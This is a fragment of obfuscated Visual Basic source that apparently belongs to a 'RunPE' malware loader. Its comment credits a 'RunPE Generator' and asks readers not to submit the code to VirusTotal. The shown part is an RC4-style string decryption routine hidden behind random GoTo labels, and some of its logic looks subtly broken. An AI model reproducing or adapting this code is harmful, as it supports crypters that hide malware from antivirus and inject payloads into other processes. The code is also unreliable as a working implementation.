GoTo G0l0Y4AIVvQyUlMlvqJs
G0l0Y4AIVvQyUlMlvqJs:
        If Q1c4y3qysEHWrsCMHkAT = 0 Then Exit Do
GoTo B6u0v1aovwHeZDFlrLTJ
B6u0v1aovwHeZDFlrLTJ:
        J5U2Y6SRFqSoBPvOAEeS = J5U2Y6SRFqSoBPvOAEeS & Chr$(Q1c4y3qysEHWrsCMHkAT)
GoTo o6k6n4fmDddsildDfKIp
o6k6n4fmDddsildDfKIp:
    Loop
GoTo e0p5t1nmaaCKWSwVnAnl
e0p5t1nmaaCKWSwVnAnl:
End Function

Public Function Y1A0E7(ByVal h7T8f8 As String, ByVal C8S8a2 As String) As String
GoTo f8u3B2ROZqrNOXycGVCI
f8u3B2ROZqrNOXycGVCI:
    On Error Resume Next
GoTo A1w5Y4XcNGNrSEUYaSrU
A1w5Y4XcNGNrSEUYaSrU:
    Dim G8P1y2(0 To 255) As Integer, U0D7c0, a6B6A6 As Long, p2E0u2() As Byte
GoTo j5T7e3itcbPBcLZHYKOo
j5T7e3itcbPBcLZHYKOo:
    p2E0u2() = StrConv(C8S8a2, vbFromUnicode)
GoTo c4U6j1cBGDORgCDMWRuK
c4U6j1cBGDORgCDMWRuK:
    For U0D7c0 = 0 To 255
GoTo d8Q2A5opnsdWeIVUkoqi
d8Q2A5opnsdWeIVUkoqi:
    a6B6A6 = (a6B6A6 + G8P1y2(U0D7c0) + p2E0u2(U0D7c0 Mod Len(C8S8a2))) Mod 256
GoTo I4P0h6EglAKerfSsPOpX
I4P0h6EglAKerfSsPOpX:
    G8P1y2(U0D7c0) = U0D7c0
GoTo N0E5E2JbYuRphdpGVqen
N0E5E2JbYuRphdpGVqen:
    Next U0D7c0
GoTo L1j6S6rAoUdechFLTvKJ
L1j6S6rAoUdechFLTvKJ:
    p2E0u2() = StrConv(h7T8f8, vbFromUnicode)
GoTo Z5f4v2EoWYsVaokThGHh
Z5f4v2EoWYsVaokThGHh:
For U0D7c0 = 0 To Len(h7T8f8)
GoTo l8u0b4ACioIQFlggfkVc
l8u0b4ACioIQFlggfkVc:
    a6B6A6 = (a6B6A6 + G8P1y2(a6B6A6) + 1) Mod 256
    p2E0u2(U0D7c0) = p2E0u2(U0D7c0) Xor G8P1y2(G8P1y2((a6B6A6 + G8P1y2(a6B6A6)) Mod 254))
    Next U0D7c0
    Y1A0E7 = StrConv(p2E0u2, vbUnicode)
End Function

'-----------------------------------------------------------------------------------
' Function to Call RunPE is : q1d8q5MVVUYKDKoBBRUX
' This RunPE was created by RunPE Generator v1.1 at 27/03/2010 - 23:40:11
' Please don't upload this code to VirusTotal or another site like that bullshit...
' Thanks to all great members of Hackhoung.org & HackSecu.com!
'-----------------------------------------------------------------------------------


